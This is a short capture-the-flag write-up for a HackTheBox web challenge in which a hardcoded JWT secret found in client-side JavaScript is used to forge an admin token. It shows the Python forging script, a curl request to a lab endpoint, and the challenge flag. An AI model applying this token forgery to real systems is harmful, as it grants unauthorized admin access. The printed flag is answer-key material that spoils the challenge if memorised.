---
title: "Criticalops"
ctf: "HackTheBox"
date: 2026-05-22
category: web
difficulty: very-easy
flag_format: "HTB{...}"
---

# Criticalops

## Summary

A hardcoded JWT signing secret exposed in client-side JavaScript allowed forging an admin JWT, which revealed a support ticket containing the flag.

## Solution

### Step 1: Recover JWT Secret

The login page JS contained a hardcoded secret:

```javascript
let a = new TextEncoder().encode("SecretKey-CriticalOps-2025");
```

### Step 2: Forge Admin JWT

Used the secret to sign a JWT with `role: "admin"` and HS256.

```python
import jwt, datetime

secret = "SecretKey-CriticalOps-2025"
payload = {
    "id": "7e6ebbc2-c13a-42a1-a4b9-ec7ed53ef035",
    "username": "testuser456",
    "role": "admin",
    "iat": datetime.datetime.utcnow(),
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=8)
}
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

### Step 3: Read Protected Tickets

Sent a Bearer token request to `/api/tickets`:

```bash
curl -k "https://154.57.164.71:30089/api/tickets" \
  -H "Authorization: Bearer <admin-jwt>"
```

The first ticket contained the flag in its title and description.

## Flag

```
HTB{Wh0_Put_JWT_1n_Cl13nt_S1d3_lm4o}
```
